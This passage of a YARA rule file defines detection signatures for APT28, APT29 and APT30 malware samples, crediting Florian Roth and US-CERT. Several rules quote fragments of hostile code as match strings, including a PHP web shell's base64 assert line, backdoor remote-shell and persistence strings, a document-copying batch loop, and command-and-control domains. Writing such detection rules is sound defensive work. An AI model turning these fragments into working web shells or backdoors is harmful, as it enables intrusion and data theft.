\"OpenSSL 1.0.1e 11 Feb 2013\"\n        $mix10 = \"Xtunnel.exe\"\n\n    condition:\n        ((uint16(0) == 0x5A4D) or (uint16(0) == 0xCFD0)) and (($xaps) or (all of ($variant1*)) or (all of ($variant2*)) or (6 of ($mix*)))\n}\n\nrule APT28_Bundestag_Winexe\n{\n    meta:\n        description = \"Winexe tool used by Sofacy group in Bundestag APT\"\n        threat_names = \"APT28\"\n        ref = \"http://dokumente.linksfraktion.de/inhalt/report-orig.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Sofacy_Bundestag_Winexe\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"\\\\\\\\.\\\\pipe\\\\ahexec\" fullword ascii\n        $s2 = \"implevel\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 115KB and all of them\n}\n\nrule APT28_Bundestag_Mal2\n{\n    meta:\n        description = \"Sofacy Group Malware Sample 2\"\n        threat_names = \"APT28\"\n        ref = \"http://dokumente.linksfraktion.de/inhalt/report-orig.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Sofacy_Bundestag_Mal2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"PROJECT\\\\XAPS_OBJECTIVE_DLL\\\\\" ascii\n        $x2 = \"XAPS_OBJECTIVE.dll\" fullword ascii\n        $s1 = \"i`m wait\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and (1 of ($x*)) and $s1\n}\n\nrule APT28_Bundestag_Mal3\n{\n    meta:\n        description = \"Sofacy Group Malware Sample 3\"\n        threat_names = \"APT28\"\n        ref = \"http://dokumente.linksfraktion.de/inhalt/report-orig.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Sofacy_Bundestag_Mal3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"shell\\\\open\\\\command=\\\"System Volume Information\\\\USBGuard.exe\\\" install\" fullword ascii\n        $s2 = \".?AVAgentModuleRemoteKeyLogger@@\" fullword ascii\n        $s3 = \"<font size=4 color=red>process isn't exist</font>\" fullword ascii\n        $s4 = \"<font size=4 color=red>process is exist</font>\" fullword ascii\n        $s5 = \".winnt.check-fix.com\" fullword ascii\n        $s6 = \".update.adobeincorp.com\" fullword ascii\n        $s7 = \".microsoft.checkwinframe.com\" fullword ascii\n        $s8 = \"adobeincorp.com\" fullword wide\n        $s9 = \"# EXC: HttpSender - Cannot create Get Channel!\" fullword ascii\n        $x1 = \"User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:20.0) Gecko/20100101 Firefox/\" wide\n        $x2 = \"User-Agent: Mozilla/5.0 (Windows NT 6.; WOW64; rv:20.0) Gecko/20100101 Firefox/2\" wide\n        $x3 = \"C:\\\\Windows\\\\System32\\\\cmd.exe\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and (2 of ($s*) or (1 of ($s*) and all of ($x*)))\n}\n\nrule APT28_Bundestag_Batch\n{\n    meta:\n        description = \"Sofacy Bundestags APT Batch Script\"\n        threat_names = \"APT28\"\n        ref = \"http://dokumente.linksfraktion.de/inhalt/report-orig.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Sofacy_Bundestag_Batch\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"for %%G in (.pdf, .xls, .xlsx, .doc, .docx) do (\" ascii\n        $s2 = \"cmd /c copy\"\n        $s3 = \"forfiles\"\n\n    condition:\n        filesize < 10KB and all of them\n}\n\nrule APT28_Fybis_ELF_Backdoor_Gen1\n{\n    meta:\n        description = \"Sofacy Fysbis Linux Backdoor_Naikon_APT_Sample1\"\n        threat_names = \"APT28\"\n        ref = \"http://researchcenter.paloaltonetworks.com/2016/02/a-look-into-fysbis-sofacys-linux-backdoor/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Sofacy_Fybis_ELF_Backdoor_Gen1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Your command not writed to pipe\" fullword ascii\n        $x2 = \"Terminal don`t started for executing command\" fullword ascii\n        $x3 = \"Command will have end with \\\\n\" fullword ascii\n        $s1 = \"WantedBy=multi-user.target' >> /usr/lib/systemd/system/\" fullword ascii\n        $s2 = \"Success execute command or long for waiting executing your command\" fullword ascii\n        $s3 = \"ls /etc | egrep -e\\\"fedora*|debian*|gentoo*|mandriva*|mandrake*|meego*|redhat*|lsb-*|sun-*|SUSE*|release\\\"\" fullword ascii\n        $s4 = \"rm -f /usr/lib/systemd/system/\" fullword ascii\n        $s5 = \"ExecStart=\" fullword ascii\n        $s6 = \"<table><caption><font size=4 color=red>TABLE EXECUTE FILES</font></caption>\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 500KB and 1 of ($x*)) or (1 of ($x*) and 3 of ($s*))\n}\n\nrule APT28_Fysbis_ELF_Backdoor_Gen2\n{\n    meta:\n        description = \"Sofacy Fysbis Linux Backdoor\"\n        threat_names = \"Fysbis, APT28\"\n        ref = \"http://researchcenter.paloaltonetworks.com/2016/02/a-look-into-fysbis-sofacys-linux-backdoor/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Sofacy_Fysbis_ELF_Backdoor_Gen2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"RemoteShell\" ascii\n        $s2 = \"basic_string::_M_replace_dispatch\" fullword ascii\n        $s3 = \"HttpChannel\" ascii\n\n    condition:\n        uint16(0) == 0x457f and filesize < 500KB and all of them\n}\n\nrule APT28_Jun16_Sample1\n{\n    meta:\n        description = \"Sofacy Malware mentioned in PaloAltoNetworks APT report\"\n        threat_names = \"APT28\"\n        ref = \"http://goo.gl/mzAa97\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Sofacy_Jun16_Sample1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"clconfg.dll\" fullword ascii\n        $s2 = \"ASijnoKGszdpodPPiaoaghj8127391\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and (1 of ($s*))) or (all of them)\n}\n\nrule APT28_Jun16_Sample2\n{\n    meta:\n        description = \"Sofacy Malware mentioned in PaloAltoNetworks APT report\"\n        threat_names = \"APT28\"\n        ref = \"http://goo.gl/mzAa97\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Sofacy_Jun16_Sample2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"DGMNOEP\" fullword ascii\n        $x2 = \"/%s%s%s/?%s=\" fullword ascii\n        $s1 = \"Control Panel\\\\Dehttps=https://%snetwork.proxy.ht2\" fullword ascii\n        $s2 = \"http=http://%s:%Control Panel\\\\Denetwork.proxy.ht&ol1mS9\" fullword ascii\n        $s3 = \"svchost.dll\" fullword wide\n        $s4 = \"clconfig.dll\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 100KB and (all of ($x*))) or (3 of them)\n}\n\nrule APT28_Jun16_Sample3\n{\n    meta:\n        description = \"Sofacy Malware mentioned in PaloAltoNetworks APT report\"\n        threat_names = \"APT28\"\n        ref = \"http://goo.gl/mzAa97\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Sofacy_Jun16_Sample3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"ASLIiasiuqpssuqkl713h\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and $s1\n}\n\nrule APT28_Campaign_Mal_Feb18_cdnver\n{\n    meta:\n        description = \"Sofacy malware\"\n        threat_names = \"APT28\"\n        ref = \"https://twitter.com/ClearskySec/status/960924755355369472\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Sofacy_Campaign_Mal_Feb18_cdnver\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"cdnver.dll\" fullword wide\n        $x2 = { 25 73 0A 00 00 00 00 00 30 00 00 00 20 00 2D 00\n              20 00 00 00 0A 00 00 00 25 00 73 00 00 00 00 00\n              69 00 6D 00 61 00 67 00 65 00 2F 00 6A 00 70 00\n              65 00 67 }\n        $s1 = \"S7%s - %lu\" fullword ascii\n        $s2 = \"SNFIRNW\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 90KB and (pe.imphash() == \"01f3d0fe6fb9d9df24620e67afc143c7\" or 1 of ($x*) or 2 of them)\n}\n\nrule APT28_Trojan_Loader_Feb18_1\n{\n    meta:\n        description = \"Sofacy Activity Feb 2018\"\n        threat_names = \"APT28\"\n        ref = \"https://www.reverse.it/sample/e3399d4802f9e6d6d539e3ae57e7ea9a54610a7c4155a6541df8e94d67af086e?environmentId=100\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Sofacy_Trojan_Loader_Feb18_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"%appdata%\\\\nad.dll\" fullword wide\n        $s3 = \"%appdata%\\\\nad.bat\" fullword wide\n        $s1 = \"apds.dll\" fullword ascii\n        $s2 = \"nad.dll\\\"\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and (pe.imphash() == \"a2d1be6502b4b3c28959a4fb0196ea45\" or pe.exports(\"VidBitRpl\") or 1 of ($x*) or 2 of them)\n}\n\nrule APT28_Oct17_1\n{\n    meta:\n        description = \"Sofacy malware reported in October 2017\"\n        threat_names = \"APT28\"\n        ref = \"http://blog.talosintelligence.com/2017/10/cyber-conflict-decoy-document.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Sofacy_Oct17_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"%localappdata%\\\\netwf.dll\" fullword wide\n        $x2 = \"set path = \\\"%localappdata%\\\\netwf.dll\\\"\" fullword ascii\n        $x3 = \"%localappdata%\\\\netwf.bat\" fullword wide\n        $x4 = \"KlpSvc.dll\" fullword ascii\n        $g1 = \"set path = \\\"%localappdata%\\\\\" ascii\n        $g2 = \"%localappdata%\\\\\" wide\n        $s1 = \"start rundll32.exe %path %,#1a\" fullword ascii\n        $s2 = \"gshell32\" fullword wide\n        $s3 = \"s - %lu\" fullword ascii\n        $s4 = \"be run i\" fullword ascii\n        $s5 = \"ingToBinhary\" fullword ascii\n        $s6 = \"%j%Xjs\" fullword ascii\n        $s7 = \"if NOT exist %path % (exit)\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and (pe.imphash() == \"a2d1be6502b4b3c28959a4fb0196ea45\" or pe.exports(\"KlpSvc\") or (1 of ($x*) or 4 of them) or ($s1 and all of ($g*)))\n}\n\nrule APT28_Oct17_2\n{\n    meta:\n        description = \"Sofacy malware reported in October 2017\"\n        threat_names = \"APT28\"\n        ref = \"http://blog.talosintelligence.com/2017/10/cyber-conflict-decoy-document.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Sofacy_Oct17_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"netwf.dll\" fullword wide\n        $s1 = \"%s - %s - %2.2x\" fullword wide\n        $s2 = \"%s - %lu\" fullword ascii\n        $s3 = \"%s \\\"%s\\\", %s\" fullword wide\n        $s4 = \"%j%Xjsf\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 90KB and (pe.imphash() == \"13344e2a717849489bcd93692f9646f7\" or (4 of them))) or (all of them)\n}\n\nrule APT29_PAS_TOOL_PHP_WEB_KIT_mod\n{\n    meta:\n        description = \"PAS Tool PHP Web Kit\"\n        threat_names = \"PAS, APT29\"\n        ref = \"https://www.us-cert.gov/security-publications/GRIZZLY-STEPPE-Russian-Malicious-Cyber-Activity\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT - modified by Florian Roth due to performance reasons\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"PAS_TOOL_PHP_WEB_KIT_mod\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $php = \"<?php\"\n        $base64decode1 = \"='base'.(\"\n        $strreplace = \"str_replace(\\\"\\\\n\\\", ''\"\n        $md5 = \".substr(md5(strrev(\"\n        $gzinflate = \"gzinflate\"\n        $cookie = \"_COOKIE\"\n        $isset = \"isset\"\n\n    condition:\n        $php at 0 and (filesize > 10KB and filesize < 30KB) and #cookie == 2 and #isset == 3 and all of them\n}\n\nrule APT29_WebShell_PHP_Web_Kit_v3\n{\n    meta:\n        description = \"PAS Tool PHP Web Kit\"\n        threat_names = \"PAS, APT29\"\n        ref = \"https://github.com/wordfence/grizzly\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WebShell_PHP_Web_Kit_v3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $php = \"<?php $\"\n        $php2 = \"@assert(base64_decode($_REQUEST[\"\n        $s1 = \"(str_replace(\\\"\\\\n\\\", '', '\"\n        $s2 = \"(strrev($\" ascii\n        $s3 = \"de'.'code';\" ascii\n\n    condition:\n        ($php at 0 or $php2) and filesize > 8KB and filesize < 100KB and all of ($s*)\n}\n\nrule APT29_WebShell_PHP_Web_Kit_v4\n{\n    meta:\n        description = \"PAS Tool PHP Web Kit\"\n        threat_names = \"PAS, APT29\"\n        ref = \"https://github.com/wordfence/grizzly\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WebShell_PHP_Web_Kit_v4\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $php = \"<?php $\"\n        $s1 = \"(StR_ReplAcE(\\\"\\\\n\\\",'',\"\n        $s2 = \";if(PHP_VERSION<'5'){\" ascii\n        $s3 = \"=SuBstr_rePlACe(\" ascii\n\n    condition:\n        $php at 0 and filesize > 8KB and filesize < 100KB and 2 of ($s*)\n}\n\nrule APT29_IMPLANT_10_v2\n{\n    meta:\n        description = \"CozyDuke / CozyCar / CozyBear Implant by APT29\"\n        threat_names = \"CozyDuke / CozyCar / CozyBear, APT29\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_10_v2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $xor = { 34 ?? 66 33 C1 48 FF C1 }\n        $nop = { 66 66 66 66 66 66 0f 1f 84 00 00 00 00 00}\n\n    condition:\n        uint16(0) == 0x5A4D and $xor and $nop\n}\n\nrule APT29_Unidentified_Malware_Two\n{\n    meta:\n        description = \"Unidentified Implant by APT29\"\n        threat_names = \"APT29\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Unidentified_Malware_Two\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $my_string_one = \"/zapoy/gate.php\"\n        $my_string_two = { E3 40 FE 45 FD 0F B6 45 FD 0F B6 14 38 88 55 FF 00 55\n         FC 0F B6 45 FC 8A 14 38 88 55 FE 0F B6 45 FD 88 14 38 0F B6 45 FC 8A\n         55 FF 88 14 38 8A 55 FF 02 55 FE 8A 14 3A 8B 45 F8 30 14 30 }\n        $my_string_three = \"S:\\\\Lidstone\\\\renewing\\\\HA\\\\disable\\\\In.pdb\"\n        $my_string_four = { 8B CF 0F AF CE 8B C6 99 2B C2 8B 55 08 D1 F8 03 C8\n         8B 45 FC 03 C2 89 45 10 8A 00 2B CB 32 C1 85 DB 74 07 }\n        $my_string_five = \"fuckyou1\"\n        $my_string_six = \"xtool.exe\"\n\n    condition:\n        ($my_string_one and $my_string_two) or ($my_string_three or $my_string_four) or ($my_string_five and $my_string_six)\n}\n\nrule APT29_IMPLANT_7_v1\n{\n    meta:\n        description = \"Implant 7 by APT29\"\n        threat_names = \"APT29\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_7_v1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $STR1 = { 8A 44 0A 03 32 C3 0F B6 C0 66 89 04 4E 41 3B CF 72 EE }\n        $STR2 = { F3 0F 6F 04 08 66 0F EF C1 F3 0F 7F 04 11 83 C1 10 3B CF 72 EB }\n\n    condition:\n        (uint16(0) == 0x5A4D) and ($STR1 or $STR2)\n}\n\nrule APT29_IMPLANT_8_v1\n{\n    meta:\n        description = \"HAMMERTOSS / HammerDuke Implant by APT29\"\n        threat_names = \"HAMMERTOSS/HammerDuke, APT29\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_8_v1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $DOTNET = \"mscorlib\" ascii\n        $REF_URL = \"https://www.google.com/url?sa=\" wide\n        $REF_var_1 = \"&rct=\" wide\n        $REF_var_2 = \"&q=&esrc=\" wide\n        $REF_var_3 = \"&source=\" wide\n        $REF_var_4 = \"&cd=\" wide\n        $REF_var_5 = \"&ved=\" wide\n        $REF_var_6 = \"&url=\" wide\n        $REF_var_7 = \"&ei=\" wide\n        $REF_var_8 = \"&usg=\" wide\n        $REF_var_9 = \"&bvm=\" wide\n        $REF_value_1 = \"QFj\" wide\n        $REF_value_2 = \"bv.81\" wide\n\n    condition:\n        (uint16(0) == 0x5A4D) and ($DOTNET) and ($REF_URL) and (3 of ($REF_var*)) and (1 of ($REF_value*))\n}\n\nrule APT29_IMPLANT_9_v1\n{\n    meta:\n        description = \"Onion Duke Implant by APT29\"\n        threat_names = \"Onion Duke, APT29\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_9_v1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $STR1 = { 8B 03 8A 54 01 03 32 55 FF 41 88 54 39 FF 3B CE 72 EE }\n        $STR2 = { 8B C8 83 E1 03 8A 54 19 08 8B 4D 08 32 54 01 04 40 88 54 38 FF\n         3B C6 72 E7 }\n        $STR3 = { 8B 55 F8 8B C8 83 E1 03 8A 4C 11 08 8B 55 FC 32 0C 10 8B 17 88\n         4C 02 04 40 3B 06 72 E3 }\n\n    condition:\n        (uint16(0) == 0x5A4D or uint16(0)) and all of them\n}\n\nrule APT30_Generic_H\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: db3e5c2f2ce07c2d3fa38d6fc1ceb854)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Generic_H\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"\\\\Temp1020.txt\" fullword ascii\n        $s1 = \"Xmd.Txe\" fullword ascii\n        $s2 = \"\\\\Internet Exp1orer\" fullword ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_2\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: c4dec6d69d8035d481e4f2c86f580e81)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Sample_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"ForZRLnkWordDlg.EXE\" fullword wide\n        $s1 = \"ForZRLnkWordDlg Microsoft \" fullword wide\n        $s9 = \"ForZRLnkWordDlg 1.0 \" fullword wide\n        $s11 = \"ForZRLnkWordDlg\" fullword wide\n        $s12 = \" (C) 2011\" fullword wide\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_3\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: 59e055cee87d8faf6f701293e5830b5a)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Sample_3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s5 = \"Software\\\\Mic\" ascii\n        $s6 = \"HHOSTR\" ascii\n        $s9 = \"ThEugh\" fullword ascii\n        $s10 = \"Moziea/\" ascii\n        $s12 = \"%s%s(X-\" ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_C\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: 0c4fcef3b583d0ffffc2b14b9297d3a4)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Generic_C\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"MYUSER32.dll\" fullword ascii\n        $s1 = \"MYADVAPI32.dll\" fullword ascii\n        $s2 = \"MYWSOCK32.dll\" fullword ascii\n        $s3 = \"MYMSVCRT.dll\" fullword ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_4\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: 6ba315275561d99b1eb8fc614ff0b2b3)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Sample_4\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"GetStartupIn\" ascii\n        $s1 = \"enMutex\" ascii\n        $s2 = \"tpsvimi\" ascii\n        $s3 = \"reateProcesy\" ascii\n        $s5 = \"FreeLibr1y*S\" ascii\n        $s6 = \"foAModuleHand\" ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_5\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: ebf42e8b532e2f3b19046b028b5dfb23)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Sample_5\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Version 4.7.3001\" fullword wide\n        $s1 = \"Copyright (c) Microsoft Corporation 2004\" fullword wide\n        $s3 = \"Microsoft(R) is a registered trademark of Microsoft Corporation in the U\" wide\n        $s7 = \"msmsgs\" fullword wide\n        $s10 = \"----------------g_nAV=%d,hWnd:0x%X,className:%s,Title:%s,(%d,%d,%d,%d),BOOL=%d\" fullword ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_6\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: ee1b23c97f809151805792f8778ead74)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Sample_6\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"GreateProcessA\" fullword ascii\n        $s1 = \"Ternel32.dll\" fullword ascii\n\n    condition:\n        